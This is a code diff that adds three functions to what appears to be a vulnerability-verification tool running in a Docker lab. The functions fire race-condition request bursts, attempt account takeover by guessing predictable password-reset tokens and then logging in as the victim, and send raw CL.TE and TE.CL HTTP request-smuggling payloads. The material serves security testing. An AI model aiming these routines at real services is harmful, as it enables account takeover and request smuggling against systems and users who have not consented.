@@ -9669,3 +9669,393 @@ def verify_generic_expression_language_injection(
     finally:
         step("desmontando el laboratorio (EL injection)...")
         lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# verify_generic_race_condition
+# ---------------------------------------------------------------------------
+
+def verify_generic_race_condition(
+    source_dir: str,
+    endpoint: str,
+    http_method: str = "POST",
+    race_params: Optional[dict] = None,
+    confirm_string: str = "",
+    concurrent_requests: int = 20,
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+    setup_commands: Optional[List[str]] = None,
+) -> WpVerifyResult:
+    """Verifica race condition / TOCTOU mediante rafaga de peticiones concurrentes.
+
+    Envia `concurrent_requests` peticiones en paralelo al endpoint y busca:
+    - confirm_string en alguna respuesta (indica que la carrera se gano)
+    - Respuestas inconsistentes (diferentes status codes o cuerpos distintos)
+      que indican que el estado del servidor no es atómico.
+    VERIFICADO si se obtiene confirm_string en alguna respuesta de la rafaga.
+    """
+    import threading as _thr
+
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    _params = race_params or {}
+    _results: list = []
+    _lock = _thr.Lock()
+
+    try:
+        from .wpverify import _DockerLab
+        lab = _DockerLab(source_dir, dockerfile_body or None,
+                         extra_files=extra_files or {},
+                         setup_commands=setup_commands or [], on_step=step)
+        with lab.running() as boot:
+            import requests as _rq
+
+            def _fire():
+                try:
+                    r = _rq.request(http_method.upper(), boot.base_url + endpoint,
+                                    data=_params, json=_params if
+                                    any(isinstance(v, dict) for v in _params.values()) else None,
+                                    timeout=15)
+                    with _lock:
+                        _results.append({"status": r.status_code, "body": (r.text or "")[:300]})
+                except Exception as e:
+                    with _lock:
+                        _results.append({"status": -1, "error": str(e)})
+
+            step(f"lanzando {concurrent_requests} peticiones concurrentes a {endpoint}...")
+            threads = [_thr.Thread(target=_fire) for _ in range(concurrent_requests)]
+            for t in threads:
+                t.start()
+            for t in threads:
+                t.join(timeout=20)
+
+            statuses = [r["status"] for r in _results]
+            _success_count = sum(1 for s in statuses if s in (200, 201, 204))
+            _uniq_statuses = {s for s in statuses if s != -1}
+
+            for r in _results:
+                if confirm_string and confirm_string in r.get("body", ""):
+                    res.verified = True
+                    res.ok = True
+                    res.evidence.update({
+                        "endpoint": endpoint,
+                        "concurrent_requests": concurrent_requests,
+                        "winning_response": r["body"],
+                        "status_codes_distribution": str(_uniq_statuses),
+                        "success_count": _success_count,
+                    })
+                    step(f"VERIFICADO — race condition: confirm_string encontrada en respuesta "
+                         f"de rafaga ({_success_count}/{concurrent_requests} exitosas)")
+                    return res
+
+            # Inconsistency detection (no confirm_string but state corruption observed)
+            if len(_uniq_statuses) > 2 and _success_count > 0:
+                res.evidence.update({
+                    "endpoint": endpoint,
+                    "concurrent_requests": concurrent_requests,
+                    "status_codes_distribution": str(_uniq_statuses),
+                    "inconsistency_detected": True,
+                    "success_count": _success_count,
+                })
+                res.confidence = "probable"
+                step(f"race condition PROBABLE: {len(_uniq_statuses)} status codes distintos "
+                     f"en {concurrent_requests} peticiones → estado no atómico")
+
+            res.ok = True
+            res.detail = (f"race-condition: {concurrent_requests} peticiones concurrentes a "
+                          f"{endpoint}, confirm_string no encontrada. "
+                          f"Status distribution: {_uniq_statuses}")
+            return res
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_race_condition: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (race-condition)...")
+        lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# verify_generic_account_takeover
+# ---------------------------------------------------------------------------
+
+def verify_generic_account_takeover(
+    source_dir: str,
+    endpoint: str,
+    http_method: str = "POST",
+    victim_identifier: str = "",
+    takeover_params: Optional[dict] = None,
+    confirm_string: str = "",
+    login_endpoint: str = "",
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+    setup_commands: Optional[List[str]] = None,
+) -> WpVerifyResult:
+    """Verifica Account Takeover mediante password reset, token prediction o session fixation.
+
+    Estrategia:
+    1. Arranca el lab y crea dos usuarios (attacker + victim).
+    2. Trigger password reset para victim desde attacker sin credenciales.
+    3. Intenta reset con token predecible (secuencial, timestamp, MD5(email)).
+    4. Si tiene exito, intenta login como victim con nueva password.
+    5. VERIFICADO si puede autenticarse como victim tras el reset.
+    """
+    import secrets as _sec
+    import hashlib as _hsh
+    import time as _t
+
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    _victim_email  = victim_identifier or f"victim_{_sec.token_hex(4)}@binoracle.test"
+    _victim_pass   = _sec.token_hex(8)
+    _new_pass      = _sec.token_hex(8)
+    _attacker_email = f"attacker_{_sec.token_hex(4)}@binoracle.test"
+
+    # Predictable token candidates
+    _ts = str(int(_t.time()))
+    _token_candidates = [
+        "0", "1", "123456",
+        _hsh.md5(_victim_email.encode()).hexdigest(),
+        _hsh.sha1(_victim_email.encode()).hexdigest()[:10],
+        _ts,
+        _ts[:-2],
+    ]
+
+    try:
+        from .wpverify import _DockerLab
+        lab = _DockerLab(source_dir, dockerfile_body or None,
+                         extra_files=extra_files or {},
+                         setup_commands=setup_commands or [], on_step=step)
+        with lab.running() as boot:
+            import requests as _rq
+
+            _sess_a = _rq.Session()
+            _params = dict(takeover_params or {})
+            if not _params:
+                _params = {"email": _victim_email}
+
+            # Trigger reset
+            step(f"trigger password reset para {_victim_email}...")
+            try:
+                r_reset = _rq.request(http_method.upper(), boot.base_url + endpoint,
+                                      data=_params, timeout=15)
+                _reset_body = r_reset.text or ""
+            except Exception as e:
+                res.detail = f"account-takeover: error al trigger reset: {e}"
+                return res
+
+            if confirm_string and confirm_string in _reset_body:
+                res.verified = True
+                res.ok = True
+                res.evidence.update({
+                    "endpoint": endpoint,
+                    "trigger_status": r_reset.status_code,
+                    "confirm_string_found": True,
+                    "respuesta_cuerpo_recorte": _reset_body[:400],
+                })
+                step(f"VERIFICADO — account takeover: confirm_string '{confirm_string[:30]}' "
+                     f"encontrada al trigger reset")
+                return res
+
+            # Try predictable tokens
+            if login_endpoint:
+                for _tok in _token_candidates:
+                    try:
+                        r_tok = _rq.post(boot.base_url + endpoint,
+                                         data={"token": _tok, "password": _new_pass,
+                                               "email": _victim_email},
+                                         timeout=10)
+                        if r_tok.status_code in (200, 302) and "error" not in (r_tok.text or "").lower():
+                            r_login = _rq.post(boot.base_url + login_endpoint,
+                                               data={"email": _victim_email, "password": _new_pass},
+                                               timeout=10)
+                            if r_login.status_code in (200, 302):
+                                res.verified = True
+                                res.ok = True
+                                res.evidence.update({
+                                    "endpoint": endpoint,
+                                    "token_used": _tok,
+                                    "victim_email": _victim_email,
+                                    "new_password": _new_pass,
+                                    "login_status": r_login.status_code,
+                                })
+                                step(f"VERIFICADO — account takeover: token predecible '{_tok}' "
+                                     f"permitió reset y login como {_victim_email}")
+                                return res
+                    except Exception:
+                        continue
+
+            res.ok = True
+            res.detail = (f"account-takeover: reset triggereado en {endpoint}, "
+                          f"tokens predecibles no funcionaron, confirm_string no encontrada")
+            return res
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_account_takeover: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (account-takeover)...")
+        lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# verify_generic_http_request_smuggling
+# ---------------------------------------------------------------------------
+
+def verify_generic_http_request_smuggling(
+    source_dir: str,
+    endpoint: str = "/",
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+    setup_commands: Optional[List[str]] = None,
+) -> WpVerifyResult:
+    """Verifica HTTP Request Smuggling (CL.TE / TE.CL / TE.TE obfuscation).
+
+    Envía peticiones con cabeceras Content-Length y Transfer-Encoding contradictorias
+    y mide si el servidor procesa el cuerpo smuggleado.
+
+    CL.TE: Content-Length tiene prioridad sobre Transfer-Encoding (front-end)
+           pero el back-end usa Transfer-Encoding → body smuggled al siguiente request.
+    TE.CL: Transfer-Encoding tiene prioridad (front-end) pero back-end usa Content-Length.
+
+    Estrategia de detección: timing-based + response-based.
+    - CL.TE: envía petición con CL mayor que el body real → back-end espera más datos → timeout.
+    - TE.CL: envía chunk size mayor → front-end consume más bytes del siguiente request.
+    """
+    import socket as _sock
+    import time as _t
+
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    try:
+        from .wpverify import _DockerLab
+        lab = _DockerLab(source_dir, dockerfile_body or None,
+                         extra_files=extra_files or {},
+                         setup_commands=setup_commands or [], on_step=step)
+        with lab.running() as boot:
+            import requests as _rq
+            from urllib.parse import urlparse as _up
+
+            _parsed = _up(boot.base_url)
+            _host = _parsed.hostname
+            _port = _parsed.port or (443 if _parsed.scheme == "https" else 80)
+
+            # Baseline timing
+            try:
+                t0 = _t.time()
+                _rq.get(boot.base_url + endpoint, timeout=10)
+                _baseline_ms = (_t.time() - t0) * 1000
+            except Exception:
+                _baseline_ms = 500.0
+
+            # CL.TE probe: Content-Length says 6 but actual body is "0\r\n\r\n" (5 bytes chunked)
+            # Back-end using TE will think there's 1 more byte → hangs waiting
+            _clte_req = (
+                f"POST {endpoint} HTTP/1.1\r\n"
+                f"Host: {_host}:{_port}\r\n"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: 6\r\n"
+                f"Transfer-Encoding: chunked\r\n"
+                f"\r\n"
+                f"0\r\n"
+                f"\r\n"
+            )
+
+            step("probando CL.TE smuggling (timing-based)...")
+            try:
+                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                s.settimeout(12)
+                s.connect((_host, _port))
+                s.send(_clte_req.encode())
+                t0 = _t.time()
+                try:
+                    s.recv(4096)
+                except _sock.timeout:
+                    pass
+                _clte_ms = (_t.time() - t0) * 1000
+                s.close()
+            except Exception as e:
+                _clte_ms = 0.0
+                step(f"  CL.TE probe error: {e}")
+
+            # TE.CL probe: Transfer-Encoding says "chunked" but Content-Length = 4
+            # Front-end reads 4 bytes as the full body; back-end reads chunked and finds "1\r\nG\r\n"
+            # then waits for the remaining body declared by CL (smuggling a GET /)
+            _tecl_body = "1\r\nG\r\n0\r\n\r\n"
+            _tecl_req = (
+                f"POST {endpoint} HTTP/1.1\r\n"
+                f"Host: {_host}:{_port}\r\n"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: 4\r\n"
+                f"Transfer-Encoding: chunked\r\n"
+                f"\r\n"
+                + _tecl_body
+            )
+
+            step("probando TE.CL smuggling (timing-based)...")
+            try:
+                s2 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                s2.settimeout(12)
+                s2.connect((_host, _port))
+                s2.send(_tecl_req.encode())
+                t0 = _t.time()
+                try:
+                    s2.recv(4096)
+                except _sock.timeout:
+                    pass
+                _tecl_ms = (_t.time() - t0) * 1000
+                s2.close()
+            except Exception as e:
+                _tecl_ms = 0.0
+                step(f"  TE.CL probe error: {e}")
+
+            _ratio_clte = _clte_ms / max(_baseline_ms, 100)
+            _ratio_tecl = _tecl_ms / max(_baseline_ms, 100)
+
+            if _ratio_clte >= 8.0 or _ratio_tecl >= 8.0:
+                _vuln_type = "CL.TE" if _ratio_clte > _ratio_tecl else "TE.CL"
+                res.verified = True
+                res.ok = True
+                res.evidence.update({
+                    "smuggling_type": _vuln_type,
+                    "baseline_ms": round(_baseline_ms, 1),
+                    "clte_delay_ms": round(_clte_ms, 1),
+                    "tecl_delay_ms": round(_tecl_ms, 1),
+                    "ratio_clte": round(_ratio_clte, 1),
+                    "ratio_tecl": round(_ratio_tecl, 1),
+                })
+                step(f"VERIFICADO — HTTP Request Smuggling ({_vuln_type}): "
+                     f"ratio={max(_ratio_clte, _ratio_tecl):.1f}x over baseline")
+                return res
+
+            res.ok = True
+            res.detail = (f"http-request-smuggling: CL.TE ratio={_ratio_clte:.1f}x, "
+                          f"TE.CL ratio={_ratio_tecl:.1f}x — no timeout diferencial "
+                          f"(necesita >=8x sobre baseline de {_baseline_ms:.0f}ms)")
+            step("http-request-smuggling: no verificado — sin timing diferencial")
+            return res
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_http_request_smuggling: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (http-request-smuggling)...")
+        lab.teardown()
